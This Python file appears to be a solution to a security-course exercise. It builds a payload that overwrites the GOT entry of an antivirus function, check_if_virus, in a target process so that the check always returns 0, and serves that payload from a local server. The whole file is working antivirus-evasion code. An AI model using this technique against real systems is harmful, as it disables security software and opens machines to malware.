import addresses
import evasion
import struct


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the GOT entry for check_if_virus.

        Reminder: We want to replace it with another function of a similar
        signature, that will return 0.

        Notes:
        1. You can assume we already compiled q3.c into q3.template.
        2. Use addresses.CHECK_IF_VIRUS_GOT, addresses.CHECK_IF_VIRUS_ALTERNATIVE
           (and addresses.address_to_bytes).

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q3.template'
        bytes_of_address_origin = bytearray(addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_GOT))
        bytes_of_address_diff = bytearray(addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_ALTERNATIVE))
        length = 4
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            templet = reader.read()

        address_pid = templet.find(b'\x78\x56\x34\x12')
        address_origin = templet.find(b'\x22\x22\x11\x11')
        address_different = templet.find(b'\x11\x11\x22\x22')
        bytes_pid = bytearray(struct.pack('<L', pid))
        templet = bytearray(templet)
        for i in range(length):
            templet[address_pid + i] = bytes_pid[i]
            templet[address_origin + i] = bytes_of_address_origin[i]
            templet[address_different + i] = bytes_of_address_diff[i]

        return bytes(templet)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
